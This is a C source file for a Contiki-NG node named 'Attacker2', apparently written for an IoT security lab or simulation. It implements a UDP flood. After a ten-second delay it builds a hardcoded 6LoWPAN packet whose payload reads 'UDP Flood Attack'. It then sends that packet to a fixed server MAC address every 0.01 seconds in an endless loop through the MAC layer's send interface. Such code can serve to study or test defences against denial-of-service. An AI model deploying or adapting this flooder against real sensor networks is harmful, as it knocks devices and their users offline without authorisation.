#include "contiki.h"
#include "net/netstack.h"
#include "net/packetbuf.h"

#include <stdio.h>
#include <string.h>
#include "sys/log.h"

#define LOG_MODULE "Attacker2"
#define LOG_LEVEL LOG_LEVEL_INFO
#define SEND_INTERVAL (0.01 * CLOCK_SECOND)

// The UDP Server MAC address we get from the Attacker1 6LowPAN Packet
static linkaddr_t dest_addr = {{0x00, 0x12, 0x74, 0x01, 0x00, 0x01, 0x01,
0x01}};
//------------------------------------------------------------------------------
PROCESS(udp_attacker2_process, "UDP Attacker2");
AUTOSTART_PROCESSES(&udp_attacker2_process);
//------------------------------------------------------------------------------
// Imiate the "output" function in "...contiki-ng/os/net/nullnet/nullnet.c"
// It uses the MAC layer packet sending interface
static uint8_t
output(const linkaddr_t *dest_addr, const void *data, uint16_t len) {
	packetbuf_clear();
	packetbuf_copyfrom(data, len);
	if(dest_addr != NULL) {
		packetbuf_set_addr(PACKETBUF_ADDR_RECEIVER, dest_addr);
	}
	packetbuf_set_addr(PACKETBUF_ADDR_SENDER, &linkaddr_node_addr);
	LOG_INFO("Sending UDP FLOOD\n");
	NETSTACK_MAC.send(NULL, NULL);
	return 1;
}
//------------------------------------------------------------------------------
PROCESS_THREAD(udp_attacker2_process, ev, data) {
	static struct etimer periodic_timer;
	// The Attacker1 6LowPAN packet
	// 0x7ef700e106630400000100f0223d00051aa855445020466c6f6f642041747461636b
	static char str[] = {0x7e, 0xf7, 0x00, 0xe1 , 0x06, 0x63, 0x04, 0x00, 0x00,
	0x01, 0x00, 0xf0, 0x22, 0x3d, 0x00, 0x05, 0x1a, 0xa8, 0x55, 0x44, 0x50, 0x20,
	0x46, 0x6c, 0x6f, 0x6f, 0x64, 0x20, 0x41, 0x74, 0x74, 0x61, 0x63, 0x6b};
	int16_t len = sizeof(str);
	PROCESS_BEGIN();
	etimer_set(&periodic_timer, 10 * CLOCK_SECOND);
	PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
	if(!linkaddr_cmp(&dest_addr, &linkaddr_node_addr)) {
		etimer_set(&periodic_timer, SEND_INTERVAL);
		while(1) {
			PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
			// Call the output function to send the 6LowPAn packet
			output(&dest_addr, str, len);
			etimer_reset(&periodic_timer);
			}
		}
		PROCESS_END();
}
